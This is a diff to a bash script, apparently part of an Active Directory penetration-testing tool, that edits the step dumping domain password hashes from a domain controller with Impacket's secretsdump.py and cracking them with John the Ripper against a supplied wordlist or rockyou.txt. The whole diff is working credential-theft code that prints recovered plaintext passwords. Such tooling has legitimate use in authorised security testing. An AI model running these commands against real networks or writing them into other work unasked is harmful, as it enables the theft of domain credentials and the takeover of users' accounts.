@@ -759,11 +759,14 @@ if [ -z $adusr ];
                         python3 secretsdump.py "$domain"/"$adusr":"$adpw"@"$dcip" > hash 2> /dev/null
                         if [ -f $list ]
                                 then
-                                john hash $list --show > tkt 2>/dev/null
+                                rm /root/.john/john.pot 2>/dev/null
+                                john --format=NT --wordlist=$list hash > tkt 2>/dev/null
+                                echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
                                 else
                                 cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
-                                john hash ./rockyou.txt -- show > tkt 2>/dev/null
-                                rm ./rockyou.txt
+                                rm /root/.john/john.pot 2>/dev/null
+                                john --format=NT --wordlist=rockyou.txt hash > tkt 2>/dev/null
+                                echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
                         fi
 
                         rm hash
@@ -788,10 +791,18 @@ if [ -z $adusr ];
 			python3 secretsdump.py "$domain"/"$adusr":"$adpw"@"$dcip" > hash 2> /dev/null
 			if [ -f $list ]
 				then
-				john hash $list --show > tkt 2>/dev/null
+				rm /root/.john/john.pot 2>/dev/null
+				john --format=NT --wordlist=$list hash > tkt 2>/dev/null
+				echo -e "\n[*] Impacket Hash extraction results:\n" >> tkt
+				cat hash >> tkt 2>/dev/null
+				echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
 				else
 				cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
-				john hash ./rockyou.txt -- show > tkt 2>/dev/null
+				rm /root/.john/john.pot 2>/dev/null
+				john --format=NT --wordlist=rockyou.txt hash > tkt 2>/dev/null
+				echo -e "\n[*] Impacket Hash extraction results:\n" >> tkt
+				cat hash >> tkt 2>/dev/null
+				echo -e $blue[*] Recovered passwords: $green$(cat /root/.john/john.pot)$endcolor
 				rm ./rockyou.txt
 			fi
 
